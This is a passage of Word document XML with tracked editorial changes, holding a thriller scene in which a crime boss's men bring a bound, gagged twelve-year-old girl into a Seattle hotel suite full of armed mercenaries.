      <w:del w:id="2592" w:author="TextVet" w:date="2016-03-24T09:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006F3C86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, there</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sat a crystal punch</w:t>
      </w:r>
      <w:del w:id="2593" w:author="TextVet" w:date="2016-03-24T09:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006F3C86">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bowl filled with fine white powder</w:t>
      </w:r>
      <w:ins w:id="2594" w:author="TextVet" w:date="2016-03-24T09:34:00Z">
        <w:r w:rsidR="00682E5E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2595" w:author="TextVet" w:date="2016-03-24T09:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00682E5E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. It was</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> freely available to the men to enjoy at their discretion. At the moment, the </w:t>
      </w:r>
      <w:ins w:id="2596" w:author="TextVet" w:date="2016-03-24T09:35:00Z">
        <w:r w:rsidR="00145512">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">bowl’s </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>contents</w:t>
      </w:r>
      <w:del w:id="2597" w:author="TextVet" w:date="2016-03-24T09:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00145512">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of the bowl</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> were being gently picked at by the hot-pink fingernails of an anorexic young woman with more make-up than clothing. She, too, was there strictly for the men’s enjoyment, provided free of charge as a perk of employment by Ivan Zheleznov.</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A spiral staircase wound </w:t>
      </w:r>
      <w:del w:id="2598" w:author="TextVet" w:date="2016-03-24T09:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007058D6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">upwards </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>through the high ceiling to the bedrooms above. French doors opened to a balcony overlooking Lake Washington and the Seattle skyline, the city silhouetted in rich hues of orange and pink as the sun set behind the Olympic Mountains.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00275533" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2599" w:author="TextVet" w:date="2016-03-24T09:40:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2600" w:author="TextVet" w:date="2016-03-24T09:40:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00275533">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There was a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="2601" w:author="TextVet" w:date="2016-03-24T09:41:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00275533">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>commotion</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2602" w:author="TextVet" w:date="2016-03-24T09:41:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>noise</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> outside the room</w:t>
      </w:r>
      <w:ins w:id="2603" w:author="TextVet" w:date="2016-03-24T09:40:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> had</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2604" w:author="TextVet" w:date="2016-03-24T09:40:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00275533">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2605" w:author="TextVet" w:date="2016-03-24T09:40:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2606" w:author="TextVet" w:date="2016-03-24T09:40:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00275533">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>T</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he men perk</w:t>
      </w:r>
      <w:ins w:id="2607" w:author="TextVet" w:date="2016-03-24T09:40:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2608" w:author="TextVet" w:date="2016-03-24T09:40:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00275533">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> their ears. With a press of a button, the video game system went mute.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entrance of the Presidential Suite of the Medina Gallante was a pair of large cedar doors, latched with wide</w:t>
      </w:r>
      <w:ins w:id="2609" w:author="TextVet" w:date="2016-03-24T09:39:00Z">
        <w:r w:rsidR="00275533">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curving brass handles. One of those handles turned.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a blink, handguns leaped from holsters and pointed at the door. Metallic clicks echoed through the room as safeties switched off, hammers cocked, cylinders spun, and slides latched.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Through the door came a rasping, gravelly voice. “Easy, boys! It’s just me!” The double doors swung open, pushed apart by the arms of a cavalier middle-aged man in a three-piece suit. In the entryway stood the silver-haired, beak-nosed figure of Ivan Zheleznov. He strutted in like a king among loyal peasants. The mercenaries hooted greetings.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rose from the deep couch. He stood humbly and greeted Ivan with a deferential nod.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“Ah, Petya!” said Ivan. “You and I will settle up in a minute. For now, my brothers, show some love! We have a special guest!”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Three men followed him, carrying a rolled-up corduroy rug. The cylindrical mass sagged and drooped, defying their efforts to haul it through the doorway. Passinsky realized that the rug itself was squirming and bucking, trying to wriggle out of their grasp.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Just inside the doorway, once the doors were closed, it succeeded. The rolled-up rug hit the floor and emitted a muffled, high-pitched grunt. It writhed on the ground of its own accord, making tiny growl</w:t>
      </w:r>
      <w:del w:id="2610" w:author="TextVet" w:date="2016-03-24T09:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000D4CC4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing sound</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s, and began to unfurl.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From out of </w:t>
      </w:r>
      <w:ins w:id="2611" w:author="TextVet" w:date="2016-03-24T09:44:00Z">
        <w:r w:rsidR="00FA69A5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>its cocoon</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2612" w:author="TextVet" w:date="2016-03-24T09:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FA69A5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>the rolled-up rug</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> crawled a twelve-year-old girl.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Rosie Mukhayev’s hands were tied behind her back</w:t>
      </w:r>
      <w:r w:rsidR="007A6C25">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007A6C25">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">uct tape </w:t>
      </w:r>
      <w:r w:rsidR="007A6C25">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>muzzl</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ed her mouth. She </w:t>
      </w:r>
      <w:ins w:id="2613" w:author="TextVet" w:date="2016-03-25T09:22:00Z">
        <w:r w:rsidR="005602D5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>sc</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2614" w:author="TextVet" w:date="2016-03-25T09:23:00Z">
        <w:r w:rsidR="005602D5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2615" w:author="TextVet" w:date="2016-03-25T09:22:00Z">
        <w:r w:rsidR="005602D5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ambl</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2616" w:author="TextVet" w:date="2016-03-25T09:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005602D5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>climb</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed to her feet and spun around, finding herself surrounded by large men.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One henchman clasped </w:t>
      </w:r>
      <w:del w:id="2617" w:author="TextVet" w:date="2016-03-25T09:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00513859">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">his </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">calloused fingers around her elbows and held her in place. She tried going limp to slide </w:t>
      </w:r>
      <w:ins w:id="2618" w:author="TextVet" w:date="2016-03-25T09:24:00Z">
        <w:r w:rsidR="00090891">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>from</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2619" w:author="TextVet" w:date="2016-03-25T09:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00090891">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>out of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his grasp, but </w:t>
      </w:r>
      <w:ins w:id="2620" w:author="TextVet" w:date="2016-03-25T09:23:00Z">
        <w:r w:rsidR="00A00A81">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">succeeded </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2621" w:author="TextVet" w:date="2016-03-25T09:24:00Z">
        <w:r w:rsidR="00A00A81">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>onl</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2622" w:author="TextVet" w:date="2016-03-25T09:23:00Z">
        <w:r w:rsidR="00D000E7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>y</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2623" w:author="TextVet" w:date="2016-03-25T09:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D000E7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">all it did </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2624" w:author="TextVet" w:date="2016-03-25T09:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D000E7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>was</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2625" w:author="TextVet" w:date="2016-03-25T09:24:00Z">
        <w:r w:rsidR="00D000E7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> in</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> twist</w:t>
      </w:r>
      <w:ins w:id="2626" w:author="TextVet" w:date="2016-03-25T09:24:00Z">
        <w:r w:rsidR="00D000E7">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her shoulder. Futilely, she kicked and body-checked against him, making small, furious noises.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circle of men parted to make way for Ivan as he approached the young girl. He cocked his head, studying her like an eagle eyeing a cornered rabbit. He reached </w:t>
      </w:r>
      <w:ins w:id="2627" w:author="TextVet" w:date="2016-03-25T09:25:00Z">
        <w:r w:rsidR="00703EF8" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">a bony, gnarled hand </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2628" w:author="TextVet" w:date="2016-03-25T09:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00703EF8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">out </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>toward her face</w:t>
      </w:r>
      <w:del w:id="2629" w:author="TextVet" w:date="2016-03-25T09:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00703EF8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> with a bony, gnarled hand</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, slid a jagged fingernail against </w:t>
      </w:r>
      <w:del w:id="2630" w:author="TextVet" w:date="2016-03-25T09:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00013FB6">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he</w:t>
      </w:r>
      <w:ins w:id="2631" w:author="TextVet" w:date="2016-03-25T09:25:00Z">
        <w:r w:rsidR="00013FB6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>r mouth</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gag</w:t>
      </w:r>
      <w:del w:id="2632" w:author="TextVet" w:date="2016-03-25T09:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00013FB6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2633" w:author="TextVet" w:date="2016-03-25T09:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00013FB6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>over her mouth</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, and yanked the tape from her skin with a loud rip.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took a deep breath, and screamed. Her shrill, </w:t>
      </w:r>
      <w:ins w:id="2634" w:author="TextVet" w:date="2016-03-25T09:27:00Z">
        <w:r w:rsidR="00852F20">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>steam-</w:t>
        </w:r>
        <w:r w:rsidR="00852F20" w:rsidRPr="000D3488">
          <w:rPr>
